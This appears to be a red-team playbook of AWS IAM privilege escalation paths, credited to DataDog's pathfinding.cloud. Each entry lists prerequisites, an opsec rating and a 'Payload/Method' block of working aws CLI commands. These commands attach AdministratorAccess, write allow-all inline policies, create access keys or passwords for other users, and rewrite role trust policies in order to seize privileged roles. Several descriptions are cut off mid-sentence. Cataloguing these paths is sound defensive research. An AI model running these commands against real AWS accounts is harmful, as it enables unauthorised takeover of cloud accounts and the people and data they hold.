# IAM - AWS IAM Privilege Escalation Paths
> Source: pathfinding.cloud (DataDog Security Labs)

### iam:CreatePolicyVersion [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:CreatePolicyVersion; Policy must already be attached to the actor's user, role, or group
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-001] Anyone with access to `iam:CreatePolicyVersion` can create a new version of an IAM policy. If a user can create a new version of a policy that is already attached to them, they can grant themselves administrative privileges by creating a new policy version with elevated permissions and setting it as the default version. A principal can also leverage this to escalate the permissions of another prin
- **Payload/Method:**
```
# Step 1: Create a new policy version with administrative permissions and set it as default
aws iam create-policy-version --policy-arn @arn --policy-document file://admin_policy.json --set-as-default
```

### iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateAccessKey; Target user must have fewer than 2 access keys already
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-002] Anyone with access to `iam:CreateAccessKey` can create access keys for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.
- **Payload/Method:**
```
# Step 1: Create a new access key for the target user
aws iam create-access-key --user-name @username

# Step 2: Configure AWS CLI with the newly created access key
aws configure --profile target-user

# Step 3: Verify access as the target user
aws sts get-caller-identity --profile target-user
```

### iam:CreateAccessKey + iam:DeleteAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateAccessKey, iam:DeleteAccessKey; Target user has 2 access keys (maximum allowed)
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-003] This is a variation of `iam:CreateAccessKey` that works even when the target user already has 2 access keys (the AWS maximum). By combining `iam:CreateAccessKey` with `iam:DeleteAccessKey`, an attacker can first delete one of the existing keys, then create a new access key for themselves, gaining access to the target user's permissions.
- **Payload/Method:**
```
# Step 1: List existing access keys for the target user
aws iam list-access-keys --user-name @username

# Step 2: Delete one of the existing access keys
aws iam delete-access-key --user-name @username --access-key-id @access-key-id

# Step 3: Create a new access key for the target user
aws iam create-access-key --user-name @username

# Step 4: Configure AWS CLI with the newly created access key
aws configure --profile target-user
```

### iam:CreateLoginProfile [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreateLoginProfile; Target user must NOT currently have a login profile
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-004] Anyone with access to `iam:CreateLoginProfile` can create console login profiles for any user they have this permission on. This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal via the AWS Console.
- **Payload/Method:**
```
# Step 1: Create a console login profile with a known password for the target user
aws iam create-login-profile --user-name @username --password @password

# Step 2: Access AWS Console as the target user
# Login to AWS Console with the username and password
```

### iam:PutRolePolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutRolePolicy; Principal must be a role (not a user, since IAM users cannot have inline role po
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-005] A principal with `iam:PutRolePolicy` can attach inline policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. For self-escalation, the role can attach an inline policy to itself with any permissions, including full administrative access. A principal can also leverage this to escalate the permissions of an
- **Payload/Method:**
```
# Step 1: Create a JSON policy document granting administrative access
# Create a policy document with elevated permissions
cat > escalation_policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 2: Attach the inline policy with elevated permissions to the target role
aws iam put-role-policy \
  --role-name @rolename \
  --policy-name AdminEscalation \
  --policy-document file://escalation_policy.json

# Step 3: Verify the new permissions are active (for self-escalation, credentials remain the same)
aws sts get-caller-identity
```

### iam:UpdateLoginProfile [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:UpdateLoginProfile; Target user must already have a login profile (password)
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-006] Anyone with access to `iam:UpdateLoginProfile` can change the password of any user they have this permission on. This privilege escalation path requires the user to already have a password set (login profile exists). This permission is often abused by one principal to gain access to another principal and the permissions associated with that principal.
- **Payload/Method:**
```
# Step 1: Change the password for the target user's console login
aws iam update-login-profile --user-name @username --password @password

# Step 2: Access AWS Console as the target user
# Login to AWS Console with the username and new password
```

### iam:PutUserPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutUserPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-007] Anyone with access to `iam:PutUserPolicy` can attach inline policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach an inline policy with elevated permissions to the target user
aws iam put-user-policy --user-name @username --policy-name @policyname --policy-document file://escalation_policy.json

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachUserPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachUserPolicy; A managed IAM policy with elevated privileges must exist in the account
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-008] Anyone with access to `iam:AttachUserPolicy` can attach managed policies to any user they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the target user
aws iam attach-user-policy --user-name @username --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachRolePolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachRolePolicy; A managed IAM policy with elevated privileges must exist in the account
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-009] Anyone with access to `iam:AttachRolePolicy` can attach managed policies to any role they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges. A principal can also leverage this to escalate the permissions of another principal they can access.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the target role
aws iam attach-role-policy --role-name @rolename --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active (for self-escalation)
aws sts get-caller-identity
```

### iam:AttachGroupPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AttachGroupPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-010] Anyone with access to `iam:AttachGroupPolicy` can attach managed policies to any group they have this permission on. This permission is frequently exploited by a principal to grant themselves additional privileges by attaching policies to a group they are a member of. A principal can also leverage this to escalate the permissions of other principals in the same group.
- **Payload/Method:**
```
# Step 1: Attach the AdministratorAccess managed policy to the group
aws iam attach-group-policy --group-name @groupname --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:PutGroupPolicy [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:PutGroupPolicy; Principal must be a user (not a role)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-011] Anyone with access to `iam:PutGroupPolicy` can attach inline policies to any group they have this permission on. This permission is often abused by one principal to grant additional permissions to themselves by attaching an inline policy to a group they are a member of.
- **Payload/Method:**
```
# Step 1: Attach an inline policy with elevated permissions to the group
aws iam put-group-policy --group-name @groupname --policy-name @policyname --policy-document file://escalation_policy.json

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:UpdateAssumeRolePolicy
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-012] Anyone with access to `iam:UpdateAssumeRolePolicy` can modify the trust policy of any role they have this permission  on. This permission is often abused by one principal to modify a privileged role's trust policy to allow themselves to assume   it, thereby gaining access to the privileged role's permissions. You might think that you would also need `sts:AssumeRole` permission to exploit this, but
- **Payload/Method:**
```
# Step 1: Update the role's trust policy to allow your principal to assume it
aws iam update-assume-role-policy --role-name @rolename --policy-document file://trust_policy.json

# Step 2: Assume the privileged role
aws sts assume-role --role-arn arn:aws:iam::123456789012:role/@rolename --role-session-name exploit

# Step 3: Use the elevated permissions of the assumed role
# Configure AWS CLI with the temporary credentials from assume-role
```

### iam:AddUserToGroup [added: 2026-04]
- **Tags:** #Iam #PrivEsc #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Direct IAM write permissions detected; iam in scope
- **Prereq:** IAM perms: iam:AddUserToGroup; A group must exist with administrative permissions (e.g., AdministratorAccess)
- **Yields:** Escalated permissions on current IAM principal
- **Opsec:** Med
- **Context:** [iam-013] A principal with `iam:AddUserToGroup` can add any user to any group they have this permission on. By adding themselves to a group with elevated permissions, they can gain access to the policies attached to that group. The level of access gained depends on the permissions of the target group.
- **Payload/Method:**
```
# Step 1: Add the target user (or yourself) to a group with elevated permissions
aws iam add-user-to-group --user-name @username --group-name @privileged-group

# Step 2: Verify the new permissions are active
aws sts get-caller-identity
```

### iam:AttachRolePolicy + sts:AssumeRole [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachRolePolicy, sts:AssumeRole; A target role must exist that you have `iam:AttachRolePolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-014] This is a variation of `iam:AttachRolePolicy` (iam-009). This variation is needed when you have `iam:AttachRolePolicy` permission on another role (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different role and then assuming it. This requires both `iam:AttachRolePolicy` on the target role AND `sts:AssumeRole` permi
- **Payload/Method:**
```
# Step 1: Retrieve the AWS account ID and set the target role ARN
# Get account ID
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
TARGET_ROLE="target-role-name"
TARGET_ROLE_ARN="arn:aws:iam::$ACCOUNT_ID:role/$TARGET_ROLE"

# Step 2: Attach the AWS-managed AdministratorAccess policy to the target role
# Attach AdministratorAccess policy to the target role
aws iam attach-role-policy \
  --role-name $TARGET_ROLE \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Step 3: Wait for the policy attachment to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 4: Verify that AdministratorAccess is now attached to the target role
# Verify the policy was attached
aws iam list-attached-role-policies \
  --role-name $TARGET_ROLE \
  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
  --output table

# Step 5: Assume the target role to obtain temporary credentials with administrative permissions
# Assume the target role with admin permissions
CREDENTIALS=$(aws sts assume-role \
  --role-arn $TARGET_ROLE_ARN \
  --role-session-name privesc-session \
  --query 'Credentials' \
  --output json)

# Export the temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDENTIALS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDENTIALS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDENTIALS | jq -r '.SessionToken')
```

### iam:AttachUserPolicy + iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachUserPolicy, iam:CreateAccessKey; A target IAM user must exist that you have `iam:AttachUserPolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-015] This is a variation of `iam:AttachUserPolicy` (iam-008). This variation is needed when you have `iam:AttachUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey`
- **Payload/Method:**
```
# Step 1: Define the target user that will be modified and compromised
# Set the target user name
TARGET_USER="target-user-name"

# Step 2: Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete on
# List existing access keys for the target user
aws iam list-access-keys --user-name $TARGET_USER

# Step 3: Attach the AWS-managed AdministratorAccess policy to the target user
# Attach AdministratorAccess policy to the target user
aws iam attach-user-policy \
  --user-name $TARGET_USER \
  --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"

# Step 4: Wait for the policy attachment to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 5: Verify that AdministratorAccess is now attached to the target user
# Verify the policy was attached
aws iam list-attached-user-policies \
  --user-name $TARGET_USER \
  --query 'AttachedPolicies[*].[PolicyName,PolicyArn]' \
  --output table
```

### iam:PutUserPolicy + iam:CreateAccessKey [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:PutUserPolicy, iam:CreateAccessKey; A target IAM user must exist that you have `iam:PutUserPolicy` permission on
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-018] This is a variation of `iam:PutUserPolicy` (iam-007). This variation is needed when you have `iam:PutUserPolicy` permission on another user (not your own principal). In this scenario, you cannot directly escalate your own privileges, but you can escalate by modifying a different user and then authenticating as that user. Since the target is a user (not a role), you need `iam:CreateAccessKey` to cr
- **Payload/Method:**
```
# Step 1: Define the target user that will be modified and compromised
# Set the target user name
TARGET_USER="target-user-name"

# Step 2: Verify that the target user has fewer than 2 access keys (AWS limit). If the user already has 2 keys, you must delete on
# List existing access keys for the target user
aws iam list-access-keys --user-name $TARGET_USER

# Step 3: Create a policy document with administrative permissions (all actions on all resources)
# Create an admin policy document
cat > admin-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 4: Add the administrative inline policy to the target user using iam:PutUserPolicy
# Add the admin inline policy to the target user
aws iam put-user-policy \
  --user-name $TARGET_USER \
  --policy-name AdminEscalation \
  --policy-document file://admin-policy.json

# Step 5: Wait for the inline policy to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15
```

### iam:AttachRolePolicy + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:AttachRolePolicy, iam:UpdateAssumeRolePolicy; An IAM role must exist that you have both `iam:AttachRolePolicy` and `iam:Update
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-019] A principal with `iam:AttachRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by modifying an existing IAM role. The attacker first uses `iam:AttachRolePolicy` to attach an administrative managed policy to a target role, then uses `iam:UpdateAssumeRolePolicy` to modify the role's trust policy to allow the attacker to assume it. Once the trust policy is updated, the atta
- **Payload/Method:**
```
# Step 1: Define the target role to compromise and the administrative policy to attach
# Set the target role and policy ARNs
TARGET_ROLE="target-role-name"
ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

# Step 2: Attach an administrative managed policy (AdministratorAccess) to the target role using iam:AttachRolePolicy
# Attach the administrative policy to the target role
aws iam attach-role-policy \
  --role-name $TARGET_ROLE \
  --policy-arn $ADMIN_POLICY_ARN

# Step 3: Wait for the policy attachment to propagate across AWS infrastructure (recommended 15 seconds)
# Wait for policy attachment to propagate
sleep 15

# Step 4: Verify that the AdministratorAccess policy is now attached to the target role
# Verify the policy was attached
aws iam list-attached-role-policies --role-name $TARGET_ROLE

# Step 5: Create a new trust policy document that explicitly allows the attacker to assume the role
# Get the current principal ARN
PRINCIPAL_ARN=$(aws sts get-caller-identity --query Arn --output text)

# Create a new trust policy that includes the attacker
cat > trust-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$PRINCIPAL_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
```

### iam:CreatePolicyVersion + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:CreatePolicyVersion, iam:UpdateAssumeRolePolicy; A customer-managed IAM policy must exist that is attached to a target role
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-020] This is a variation of `iam:CreatePolicyVersion` (iam-001). This variation is needed when you have `iam:CreatePolicyVersion` permission on a customer-managed policy that is attached to a different role (not your own principal). In this scenario, you cannot directly escalate your own privileges by modifying the policy, but you can escalate by modifying the policy attached to the target role and the
- **Payload/Method:**
```
# Step 1: Define the target policy ARN, role name, and retrieve your principal ARN for the trust policy update
# Set variables for the target policy and role
POLICY_ARN="arn:aws:iam::ACCOUNT_ID:policy/target-policy-name"
TARGET_ROLE="target-role-name"
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
STARTING_PRINCIPAL_ARN=$(aws sts get-caller-identity --query 'Arn' --output text)

# Step 2: Create a policy document with full administrative permissions
# Create admin_policy.json with administrative permissions
cat > admin_policy.json << 'EOF'
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 3: Create a new policy version with administrative permissions. The --set-as-default flag makes this version active immedia
# Create a new policy version with admin permissions and set as default
aws iam create-policy-version \
  --policy-arn $POLICY_ARN \
  --policy-document file://admin_policy.json \
  --set-as-default

# Step 4: Wait for the IAM policy changes to propagate across AWS infrastructure (typically takes 10-15 seconds)
# Wait for policy changes to propagate
sleep 15

# Step 5: Create a trust policy that explicitly allows your principal to assume the target role
# Create a new trust policy that allows your principal to assume the role
cat > trust_policy.json << EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Principal": {
        "AWS": "$STARTING_PRINCIPAL_ARN"
      },
      "Action": "sts:AssumeRole"
    }
  ]
}
EOF
```

### iam:PutRolePolicy + iam:UpdateAssumeRolePolicy [added: 2026-04]
- **Tags:** #Iam #LateralMovement #IAMPrivEsc #AWS #CloudPrivEsc
- **Trigger:** Write access to another IAM principal found; iam accessible
- **Prereq:** IAM perms: iam:PutRolePolicy, iam:UpdateAssumeRolePolicy; A target IAM role must exist that you have both `iam:PutRolePolicy` and `iam:Upd
- **Yields:** Access to another principal's credentials or elevated permissions
- **Opsec:** Med
- **Context:** [iam-021] A principal with `iam:PutRolePolicy` and `iam:UpdateAssumeRolePolicy` can achieve privilege escalation by first adding an inline policy with administrative permissions to a target role, then modifying that role's trust policy to allow the attacker to assume it. The key insight is that when a principal is explicitly named in a role's trust policy, that principal can assume the role without needing 
- **Payload/Method:**
```
# Step 1: Define the target role that will be modified and assumed
# Set the target role name
TARGET_ROLE="target-role-name"

# Step 2: Create a policy document with administrative permissions (all actions on all resources)
# Create an admin policy document
cat > admin-policy.json <<EOF
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": "*",
      "Resource": "*"
    }
  ]
}
EOF

# Step 3: Add the administrative inline policy to the target role using iam:PutRolePolicy
# Add the admin inline policy to the target role
aws iam put-role-policy \
  --role-name $TARGET_ROLE \
  --policy-name AdminEscalation \
  --policy-document file://admin-policy.json

# Step 4: Wait for the inline policy to propagate across AWS infrastructure
# Wait for IAM policy changes to propagate (15 seconds)
sleep 15

# Step 5: Retrieve your current principal ARN to add to the trust policy
# Get your current principal ARN
CURRENT_ARN=$(aws sts get-caller-identity --query Arn --output text)
echo "Current principal ARN: $CURRENT_ARN"
```
